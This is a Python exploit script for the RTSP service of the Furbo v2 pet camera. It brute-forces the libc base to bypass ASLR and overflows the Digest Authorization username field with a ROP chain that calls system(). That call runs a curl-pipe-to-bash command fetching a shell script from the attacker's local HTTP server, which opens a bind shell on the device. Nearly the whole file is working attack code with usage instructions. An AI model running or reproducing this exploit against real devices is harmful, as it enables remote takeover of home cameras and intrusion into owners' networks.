########################################################################################################
# RTSP Exploit for RTSP Server on Furbo v2
#    The sleep(15) after the 2nd requestand the -s sleep option can be adjusted to attempt
#     to find an optimal timing to prevent RTSP from going into a bad state. There is a decent
#     chance that the RTSP Service will become unresponsive / hang while running this and requires
#     the furbo to powered off and back on.
#
# python3 aslr-bruteforce-final.py -t <target> -l <local-ip> -p  <bind shell port> -s <delay>
#######################################################################################################

# Imports for general, pwntools, input, and output
from pwn import *
import time, sys, os, re
import argparse
import subprocess, threading
from termcolor import cprint

# Pwntools logging
context.log_level = 'critical'

# Types of output mesages
class level:
    INFO = '+',
    WARN = '!',
    ERROR = 'E',

# Starts a local python server for target device to connect to
class ShellFileServer(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.stdo = None
        self.stde = None
    def run(self):
        try:
            # sleep(60)
            out('Starting python server thread on port 8080')
            p = subprocess.Popen('cd www && python3 -m http.server 8080',
                                 shell=True,
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE)
            stdo, stde = p.communicate()
            self.stdo = stdo.decode("utf-8")
            self.stde = stde.decode("utf-8")
        except Exception as e:
            out('Failed to start python shell server', color='red')
    # Hacky way to kill a thread... ugh I know plz stop
    def stop(self):
        out('Stopping python server thread on port 8080')
        p = subprocess.Popen('ps aux | grep "python3 -m http.server 8080" | grep -vE "(grep|sh)" | awk \'{system("sudo kill -9 "$2)}\'',
                             shell=True,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE)
        p.communicate()

# Log output to user in a readible format
def out(msg, lvl=level.INFO, color='white', attr=[], nl=True, header=True):
    if header:
        cprint('[', end='')
        cprint('{0}'.format(lvl[0]), color=('red' if lvl is level.ERROR else ('yellow' if lvl is level.WARN else 'blue')), end='')
        cprint('] ', end='')
    cprint(msg, color, attrs=attr, end=('\n' if nl else ''))

# Check to see if shell is enabled on target device and target port
def check_shell(target, port, delay):
    try:
        out('Checking for shell on port {0}.'.format(port))
        s = remote(target, port, timeout=6)
        out('Port {0} open.'.format(port), lvl=level.WARN, color='green')
        s.interactive()
        return True
    except:
        out('Port {0} is not open.'.format(port),lvl=level.WARN, color='yellow')
        return False



# Check to see if RTSP service is up and running on target device
def check_rtsp(target, delay):
    try:
        out('Checking RTSP Service')
        # Send message to RTSP port on target
        rtsp = remote(target, 554, timeout=5)
        rtsp.send(b'junkjunkjunk\r\n\r\n')
        # If target replies 400 RTSP is running
        if '400 Bad Request' in rtsp.recv(1024).decode('utf-8'):
            rtsp.close()
            out('RTSP is running', color='green')
            return True
        # If target replies with anything other than 400 it is in an unknown state
        rtsp.close()
        out('RTSP port open, but not responding as expected...', lvl=level.ERROR, color='red')
        return False
    except Exception as e:
        # If there is an exception during this check it means the RTSP service is restarting
        # Do not re-raise becuase RTSP will eventually connect correctly... hopefully
        out('Cannot connect to RTSP service', lvl=level.ERROR, color='red')
        delayOrRaise(delay, e)

# Generates payload to send from host to target device for given libc base address
def gen_payload(host, target, libc_base):
    # Instruction before returning to previous function from parse_authentication_header(): ldmia.w     sp!, {r4, r5, r6, r7, r8, r9, r10, r11, pc}
    # 1.(libc_base+0x000cc8df)  mov r3, r8; blx r4; move system address to $r3
    # 2.(libc_base+0x000c5183)  mov r0, sp; blx r3; move commands to execute to $r0
    # 3.Execute commands via system (create a bind shell)

    username = b'A'*132
    username += p32(libc_base + 0x000C5183)                                 #2
    username += b'B'*12
    username += p32(libc_base + 0x00032301)                                 #3
    username += b'C' * 12
    username += p32(libc_base + 0x000cc8df)                                 #1
    username += b'/usr/bin/curl %s:8080/shell.sh | /bin/bash' % (bytes(host,'utf-8'))

    req_header = b'GET_PARAMETER rtsp://%s:554/stream RTSP/1.0\r\n' % (bytes(target,'utf-8'))
    req_header += b'CSeq: 1\r\n'
    req_header += b'Authorization: Digest username="'
    req_header += username
    req_header += b'", realm="chicony.com", algorithm="MD5", nonce="testtesttesttest", uri="rtsp://10.1.3.53:554/stream", response="junkjunkjunkjunkjunkjunkjunkjunk"\r\n\r\n'

    # Return payload with username and target information
    return req_header

# Sends a payload from the host to the target device with the given libc base address
def send_payload(host, target, libc_base, delay):
    try:
        # Send payload to target
        out('Trying base address: ', nl=False)

        out('0x{0:X}'.format(libc_base), color='blue', header=False)
        s = remote(target, 554)
        payload = gen_payload(host, target, libc_base)

        # Print out current payload
        #out('Current Payload:%s' % (payload), color='blue',header=False)
        s.send(payload)
        s.close()
    except Exception as e:
        # If something goes wrong here notify user and re-raise to break while
        out('Host down pwntools could not connect', lvl=level.ERROR, color='red')
        delayOrRaise(delay, e)

# Replaces in with out in file
def replaceInFile(file, pattern, repl):
    out('Updating file {0} with {1}'.format(file, repl))
    data = open(file,'r').read()
    fout = open(file,'w')
    fout.write(re.sub(pattern, repl, data))
    fout.close()

# Delay or raise exception
def delayOrRaise(time, exception):
    if time:
        out('Delaying for {0} second{1}...'.format(time, 's' if time != 1 else ''), lvl=level.WARN, color='yellow')
        sleep(time)
    else:
        raise exception

# python3 aslr-bruteforce.py -t 192.168.1.44 -l 192.168.1.33 -p 4444 -s 10
def main():

    # Create user arguments
    parser = argparse.ArgumentParser(prog='furbo-aslr-bruteforce.py', description='Attempt to bruteforce libc base and spawn a bind shell via RTSP vulnerability')
    parser.add_argument('-t', '--target', action='store', type=str, required=True, help='IP address of the Furbo')
    parser.add_argument('-l', '--localhost', action='store', type=str, required=True, help='Local host IP address')
    parser.add_argument('-p', '--port', action='store', default='4444', type=str, help='Port to open reverse shell on')
    parser.add_argument('-s', '--sleep', action='store', default=10, type=int, help='Amount of time to sleep after RTSP or Connect failure')
    args = parser.parse_args()

    # Record time taken to complete attack
    start = time.time()

    # Update shell and service files with provided host IP
    replaceInFile('www/shell.sh', '[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}', args.localhost)
    replaceInFile('www/shell.service', '[0-9]{1,5} ', '{0} '.format(args.port))

    # Start shell server
    ss = ShellFileServer()
    ss.start()
    sleep(1)

    # Inform user attack has begun
    out('Starting Attack on {0}'.format(args.target))

    try:
        # Check RTSP and try payloads to bypass ASLR
        while True:
            if check_shell(args.target, args.port, args.sleep) is True:
                return
            if check_rtsp(args.target, args.sleep):
                send_payload(args.localhost, args.target, 0x76c32000, args.sleep)
                #send_payload(args.localhost, args.target, 0x76d52000, args.sleep)                          #aslr disabled

                sleep(2)
                send_payload(args.localhost, args.target, 0x76d3f000, args.sleep)
                #sleep 15 after second request to give more time to reset device
                sleep(15)
    except Exception as e:
        # No need to do anything if exception here. Already handled by functions
        if not args.delay:
            raise e
        return
    finally:
        # Kill the shell server
        ss.stop()
        # Inform user of time taken to complete attack1
        end = round(time.time()-start,2)
        out('Complete in {0} second{1}'.format(end, 's' if end != 1 else ''))

if __name__ == '__main__':
        main()
